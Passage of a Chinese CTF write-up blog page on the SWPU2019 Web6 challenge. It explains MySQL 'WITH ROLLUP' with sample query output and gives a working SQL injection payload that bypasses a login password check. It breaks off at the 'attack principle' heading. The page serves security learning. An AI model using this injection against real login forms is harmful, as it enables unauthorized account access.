@@ -1,0 +1,863 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    [SWPU2019]Web6(好题) |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="参考题目：LCTF2018中bestphp&#39;s revenge题 开题：   知识点  SQL注入中的with rollup 1234567后台判断逻辑：$sql&#x3D;&quot;select * from users where username&#x3D;&#x27;$name&#x27; and passwd&#x3D;&#x27;$pass&#x27;&quot;;$query &#x3D; mysql_query($sq">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[SWPU2019]Web6(好题)">
+<meta property="og:url" content="http://example.com/2025/06/15/[SWPU2019]Web6(%E5%A5%BD%E9%A2%98)/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="参考题目：LCTF2018中bestphp&#39;s revenge题 开题：   知识点  SQL注入中的with rollup 1234567后台判断逻辑：$sql&#x3D;&quot;select * from users where username&#x3D;&#x27;$name&#x27; and passwd&#x3D;&#x27;$pass&#x27;&quot;;$query &#x3D; mysql_query($sq">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/06/15/images/20250615125123171.png">
+<meta property="og:image" content="http://example.com/2025/06/15/images/20250615125217174.png">
+<meta property="og:image" content="http://example.com/2025/06/15/images/20250615125315377.png">
+<meta property="og:image" content="http://example.com/2025/06/15/images/20250615125408552.png">
+<meta property="og:image" content="http://example.com/2025/06/15/images/20250615133043154.png">
+<meta property="og:image" content="http://example.com/2025/06/15/images/20250615133902431.png">
+<meta property="og:image" content="http://example.com/2025/06/15/images/20250615134709689.png">
+<meta property="og:image" content="http://example.com/2025/06/15/images/20250615134956158.png">
+<meta property="og:image" content="http://example.com/2025/06/15/images/20250615134938253.png">
+<meta property="og:image" content="http://example.com/2025/06/15/images/0250615135355573.png">
+<meta property="og:image" content="http://example.com/2025/06/15/images/20250615140314096.png">
+<meta property="og:image" content="http://example.com/2025/06/15/images/20250615141338408.png">
+<meta property="og:image" content="http://example.com/2025/06/15/images/20250615160555188.png">
+<meta property="article:published_time" content="2025-06-15T04:50:17.000Z">
+<meta property="article:modified_time" content="2025-09-20T03:42:12.995Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="session反序列化">
+<meta property="article:tag" content="SQL注入中的with rollup绕过">
+<meta property="article:tag" content="SoapClient SSRF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/06/15/images/20250615125123171.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="[SWPU2019]Web6(好题)">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">[SWPU2019]Web6(好题)</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text"> 知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E4%B8%AD%E7%9A%84with-rollup"><span class="toc-number">1.1.</span> <span class="toc-text"> SQL注入中的with rollup</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text"> 信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">3.</span> <span class="toc-text"> 解题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#with-rollup%E7%BB%95%E8%BF%87%E5%AF%86%E7%A0%81%E6%A3%80%E6%B5%8B"><span class="toc-number">3.1.</span> <span class="toc-text"> with rollup绕过密码检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wsdl"><span class="toc-number">3.2.</span> <span class="toc-text"> wsdl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B6%8A%E6%9D%83"><span class="toc-number">3.3.</span> <span class="toc-text"> 越权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96ssrf"><span class="toc-number">3.4.</span> <span class="toc-text"> 反序列化+ssrf</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">186</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">4</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">179</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-[SWPU2019]Web6(好题)" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/06/15/%5BSWPU2019%5DWeb6(%E5%A5%BD%E9%A2%98)/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-06-15T04:50:17.000Z" itemprop="datePublished">2025-06-15</time>
+    <time style="display: none;" id="post-update-time">2025-09-20</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%88%B7%E9%A2%98/" data-aos="zoom-in">刷题</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p>参考题目：<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https%3A%2F%2Fxz.aliyun.com%2Ft%2F3339%23toc-3">LCTF2018</a>中<code>bestphp's revenge</code>题</p>
+<p>开题：</p>
+<p><img src="../images/20250615125123171.png" alt="image-20250615125123171" /></p>
+<h2 id="知识点"><a class="markdownIt-Anchor" href="#知识点"></a> 知识点</h2>
+<h3 id="sql注入中的with-rollup"><a class="markdownIt-Anchor" href="#sql注入中的with-rollup"></a> SQL注入中的with rollup</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">后台判断逻辑：</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from users where username=&#x27;<span class="subst">$name</span>&#x27; and passwd=&#x27;<span class="subst">$pass</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$query</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>); </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysql_num_rows</span>(<span class="variable">$query</span>) == <span class="number">1</span>) &#123; </span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>[<span class="string">&#x27;passwd&#x27;</span>] == <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]) &#123;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>先简单介绍一下 <code>with rollup</code> 是什么：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">实现在分组统计数据基础上再进行相同的统计</span><br></pre></td></tr></table></figure>
+<p>在本地测试可以清晰的看出，如果不对数据进行一些例如：计数，求和之类的操作，直接 <code>group by ... with rollup</code>，就会返回空。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> employee_tbl;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+------+---------------------+--------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> name <span class="operator">|</span> <span class="type">date</span>                <span class="operator">|</span> signin <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------+---------------------+--------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> 小明 <span class="operator">|</span> <span class="number">2016</span><span class="number">-04</span><span class="number">-22</span> <span class="number">15</span>:<span class="number">25</span>:<span class="number">33</span> <span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> 小王 <span class="operator">|</span> <span class="number">2016</span><span class="number">-04</span><span class="number">-20</span> <span class="number">15</span>:<span class="number">25</span>:<span class="number">47</span> <span class="operator">|</span>      <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> 小丽 <span class="operator">|</span> <span class="number">2016</span><span class="number">-04</span><span class="number">-19</span> <span class="number">15</span>:<span class="number">26</span>:<span class="number">02</span> <span class="operator">|</span>      <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">4</span> <span class="operator">|</span> 小王 <span class="operator">|</span> <span class="number">2016</span><span class="number">-04</span><span class="number">-07</span> <span class="number">15</span>:<span class="number">26</span>:<span class="number">14</span> <span class="operator">|</span>      <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">5</span> <span class="operator">|</span> 小明 <span class="operator">|</span> <span class="number">2016</span><span class="number">-04</span><span class="number">-11</span> <span class="number">15</span>:<span class="number">26</span>:<span class="number">40</span> <span class="operator">|</span>      <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">6</span> <span class="operator">|</span> 小明 <span class="operator">|</span> <span class="number">2016</span><span class="number">-04</span><span class="number">-04</span> <span class="number">15</span>:<span class="number">26</span>:<span class="number">54</span> <span class="operator">|</span>      <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------+---------------------+--------+</span></span><br><span class="line"><span class="number">6</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.03</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> name, <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span>   employee_tbl <span class="keyword">GROUP</span> <span class="keyword">BY</span> name;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+</span></span><br><span class="line"><span class="operator">|</span> name <span class="operator">|</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+</span></span><br><span class="line"><span class="operator">|</span> 小丽 <span class="operator">|</span>        <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> 小明 <span class="operator">|</span>        <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> 小王 <span class="operator">|</span>        <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.03</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> name, <span class="built_in">sum</span>(signin) <span class="keyword">as</span> signin_count <span class="keyword">FROM</span>   employee_tbl <span class="keyword">GROUP</span> <span class="keyword">BY</span> name <span class="keyword">with</span> <span class="keyword">rollup</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+--------------+</span></span><br><span class="line"><span class="operator">|</span> name <span class="operator">|</span> signin_count <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+--------------+</span></span><br><span class="line"><span class="operator">|</span> 小丽 <span class="operator">|</span> <span class="number">2</span>            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> 小明 <span class="operator">|</span> <span class="number">7</span>            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> 小王 <span class="operator">|</span> <span class="number">7</span>            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">16</span>           <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+--------------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.04</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> name, <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">as</span> signin_count <span class="keyword">FROM</span>   employee_tbl <span class="keyword">GROUP</span> <span class="keyword">BY</span> name <span class="keyword">with</span> <span class="keyword">rollup</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+--------------+</span></span><br><span class="line"><span class="operator">|</span> name <span class="operator">|</span> signin_count <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+--------------+</span></span><br><span class="line"><span class="operator">|</span> 小丽 <span class="operator">|</span>            <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> 小明 <span class="operator">|</span>            <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> 小王 <span class="operator">|</span>            <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span>            <span class="number">6</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+--------------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.04</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> name, signin <span class="keyword">FROM</span> employee_tbl <span class="keyword">GROUP</span> <span class="keyword">BY</span> name,signin <span class="keyword">with</span> <span class="keyword">rollup</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+--------+</span></span><br><span class="line"><span class="operator">|</span> name <span class="operator">|</span> signin <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+--------+</span></span><br><span class="line"><span class="operator">|</span> 小丽 <span class="operator">|</span>      <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> 小丽 <span class="operator">|</span> <span class="keyword">NULL</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> 小明 <span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> 小明 <span class="operator">|</span>      <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> 小明 <span class="operator">|</span>      <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> 小明 <span class="operator">|</span> <span class="keyword">NULL</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> 小王 <span class="operator">|</span>      <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> 小王 <span class="operator">|</span>      <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> 小王 <span class="operator">|</span> <span class="keyword">NULL</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+--------+</span></span><br><span class="line"><span class="number">10</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.06</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> name, <span class="built_in">count</span>(signin) <span class="keyword">FROM</span> employee_tbl <span class="keyword">GROUP</span> <span class="keyword">BY</span> name,signin <span class="keyword">with</span> <span class="keyword">rollup</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+---------------+</span></span><br><span class="line"><span class="operator">|</span> name <span class="operator">|</span> <span class="built_in">count</span>(signin) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+---------------+</span></span><br><span class="line"><span class="operator">|</span> 小丽 <span class="operator">|</span>             <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> 小丽 <span class="operator">|</span>             <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> 小明 <span class="operator">|</span>             <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> 小明 <span class="operator">|</span>             <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> 小明 <span class="operator">|</span>             <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> 小明 <span class="operator">|</span>             <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> 小王 <span class="operator">|</span>             <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> 小王 <span class="operator">|</span>             <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> 小王 <span class="operator">|</span>             <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span>             <span class="number">6</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+---------------+</span></span><br><span class="line"><span class="number">10</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.05</span> sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>那么我们只要返回空的那一列，登录时密码为空就可以登录。<br />
+limit 如果被过滤了，可以用 having 代替。</p>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; group by passwd with rollup having passwd is NULL#</span><br><span class="line">密码为空</span><br></pre></td></tr></table></figure>
+<p>总结：<strong>rollup可以对passwd进行计数，用于产生passwd=NULL的行，having用来筛选该行</strong></p>
+<h2 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h2>
+<p>一个登录框</p>
+<p>随便输入user，pass</p>
+<p><img src="../images/20250615125217174.png" alt="image-20250615125217174" /></p>
+<p>会回显后台sql语句和wrong</p>
+<p>尝试万能密码</p>
+<p><img src="../images/20250615125315377.png" alt="image-20250615125315377" /></p>
+<p>这次显示密码错误</p>
+<p>但尝试堆叠或联合注入都会爆waf</p>
+<p><img src="../images/20250615125408552.png" alt="image-20250615125408552" /></p>
+<h2 id="解题"><a class="markdownIt-Anchor" href="#解题"></a> 解题</h2>
+<h3 id="with-rollup绕过密码检测"><a class="markdownIt-Anchor" href="#with-rollup绕过密码检测"></a> with rollup绕过密码检测</h3>
+<p>回显有两种分别是wrong username or password和Wrong password说明单独对password进行了查询</p>
+<p>我们用with rollup来绕过对密码的检测</p>
+<p>后台代码逻辑猜测：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from users where username=&#x27;<span class="subst">$name</span>&#x27; and passwd=&#x27;<span class="subst">$pass</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$query</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>); </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysql_num_rows</span>(<span class="variable">$query</span>) == <span class="number">1</span>) &#123; </span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>[<span class="string">&#x27;passwd&#x27;</span>] == <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]) &#123;</span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; group by passwd with rollup having passwd is NULL#&amp;passwd=</span><br></pre></td></tr></table></figure>
+<p>登录成功</p>
+<p>攻击原理：</p>
